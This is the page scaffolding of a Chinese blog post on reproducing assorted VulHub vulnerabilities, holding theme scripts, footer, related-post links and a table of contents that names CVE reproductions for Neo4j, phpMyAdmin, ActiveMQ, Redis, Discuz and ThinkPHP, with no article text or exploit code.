+    预计阅读时间: 28 分钟
+    
+    
+
+Neo4j Shell Server 反序列化漏..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=VulHub-杂项漏洞复现 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2023/05/03/fe16a42b/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2023/05/03/fe16a42b/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/07/13/d9d69399/">攻防演练事件研判篇</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/04/28/76971e68/">VulHub-Tomcat漏洞复现</a></div></section></div>
+
+<div class="related-wrap" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2023\03\08\cc894391\" title="VulHub-Atlassian_Jira漏洞复现"><span class="title">VulHub-Atlassian_Jira漏洞复现</span></a><a class="item" href="\2023\03\07\a2dd2e70\" title="VulHub-Atlassian_Confluence漏洞复现"><span class="title">VulHub-Atlassian_Confluence漏洞复现</span></a><a class="item" href="\2023\03\10\73f4594f\" title="VulHub-Drupal漏洞复现"><span class="title">VulHub-Drupal漏洞复现</span></a><a class="item" href="\2023\03\11\247b757\" title="VulHub-Fastjson漏洞复现"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item" href="\2024\09\24\3c3f9499\" title="CS-Cobalt Strike必备知识"><span class="title">CS-Cobalt Strike必备知识</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Neo4j-Shell-Server-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2021-34371"><span class="toc-text">Neo4j Shell Server 反序列化漏洞(CVE-2021-34371)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613"><span class="toc-text">phpmyadmin 4.8.1 远程文件包含漏洞 (CVE-2018-12613)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-1"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ActiveMQ-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-5254"><span class="toc-text">ActiveMQ 反序列化漏洞(CVE-2015-5254)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-2"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%B7%BB%E5%8A%A0root%E7%94%A8%E6%88%B7"><span class="toc-text">远程添加root用户</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2016-3088"><span class="toc-text">ActiveMQ任意文件写入漏洞(CVE-2016-3088)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-3"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-text">写入webshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-4-unacc%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">Redis 4-unacc未授权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-Lua%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2022-0543"><span class="toc-text">Redis Lua沙盒绕过命令执行(CVE-2022-0543)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-4"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-5"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Discuz-7-x-6-x-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">Discuz 7.x&#x2F;6.x 全局变量防御绕过导致代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-5"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-6"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-2"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkPHP"><span class="toc-text">ThinkPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP-5-5-0-22-5-1-29-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">ThinkPHP 5 5.0.22&#x2F;5.1.29 远程代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-6"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-7"><span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+  <script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'
+
+  function load_comment(){
+    if(!document.getElementById("waline_container"))return;
+
+    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
+    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');
+
+    const el = document.getElementById("waline_container");
+    var path = el.getAttribute('comment_id');
+    if (!path) {
+      path = decodeURI(window.location.pathname);
+    }
+
+    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
+      el: '#waline_container',
+      path: path,
+      
+    }));
+
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+</div></body></html>
